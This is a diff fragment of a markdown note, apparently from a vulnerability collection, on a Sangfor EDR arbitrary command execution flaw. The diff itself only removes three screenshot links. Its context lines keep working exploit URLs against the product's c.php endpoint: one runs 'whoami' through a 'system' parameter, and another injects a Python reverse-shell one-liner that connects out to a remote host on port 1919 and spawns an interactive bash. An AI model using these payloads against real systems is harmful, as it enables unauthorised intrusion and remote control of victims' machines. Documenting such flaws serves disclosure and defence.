@@ -37,15 +37,15 @@ https://xx.xx.xx.37/tool/log/c.php?strip_slashes=system&host=whoami
 https://xx.xx.xx.37/tool/log/c.php?strip_slashes=system&path=python -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('xx.xx.xx.105',1919));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"
 ```
 
-![img](./.resource/深信服EDR任意命令执行漏洞/media/17716535-3fce5fccf8781948.jpg)
+
 
 1.jpg
 
-![img](./.resource/深信服EDR任意命令执行漏洞/media/17716535-cebfc356f6d83985.jpg)
+
 
 2.jpg
 
-![img](./.resource/深信服EDR任意命令执行漏洞/media/17716535-6058fa3d680f982e.jpg)
+
 
 3.jpg
 
